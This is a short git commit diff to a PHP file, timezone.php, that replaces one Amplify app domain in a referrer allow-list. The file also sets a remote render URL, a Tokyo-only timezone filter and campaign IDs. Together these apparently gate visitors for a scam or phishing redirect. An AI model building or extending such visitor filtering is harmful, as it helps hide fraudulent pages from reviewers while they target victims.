48a8bdbd2dab8ac683c3cd7c59cc8336e7196a70
windows0xsupport <ankitkatariacool9@gmail.com>
2026-04-30 20:26:00 +0900

    url change

--- timezone.php
+++ timezone.php
@@ -4,7 +4,7 @@ $dynamic_url = "https://onrender-3brc.onrender.com";
 
 $allowed_timezones = ['Asia/Tokyo'];
 $allowed_campaign_ids = ['12345', '67890'];
-$allowed_referrer = ['http://127.0.0.1', 'https://waveharborblog.space','https://sunaloomblog.space/', 'https://main.d3czosya9iti22.amplifyapp.com'];
+$allowed_referrer = ['http://127.0.0.1', 'https://waveharborblog.space','https://sunaloomblog.space/', 'https://main.dvxlq55q3u7wi.amplifyapp.com'];
 
 header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
